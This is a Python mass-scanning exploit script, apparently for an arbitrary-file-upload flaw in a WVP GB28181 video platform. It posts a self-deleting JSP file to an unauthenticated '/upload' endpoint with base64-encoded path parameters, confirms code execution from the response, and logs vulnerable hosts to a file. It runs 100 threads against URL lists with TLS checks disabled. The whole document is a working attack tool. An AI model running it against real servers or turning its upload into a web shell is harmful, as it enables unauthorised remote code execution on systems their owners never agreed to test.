import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
                author='wuhu'
                version=1.1.1                            """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description='WVP_GB18181')
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file')
    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urls = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                urls.append(url.strip())
        mp = Pool(100)
        mp.map(poc, urls)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.116Safari/537.36',
        'Content-Type': 'multipart/form-data;boundary=98hgfhfbuefbhbvuyh98',
        'Accept': 'text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2',
        'Connection': 'close',
    }
    data = "--98hgfhfbuefbhbvuyh98\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ceshi.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println(\"Hello World!\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n--98hgfhfbuefbhbvuyh98\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nGo\r\n--98hgfhfbuefbhbvuyh98--"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        # print(res1.text)
        if res1.status_code == 200:
            if 'demo.jsp' in res1.text:
                print(f'[+]{target}存在漏洞')
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
            else:
                print(f'[-]{target}不存在漏洞')
    except:
        print('该站点存在问题')


if __name__ == '__main__':
    main()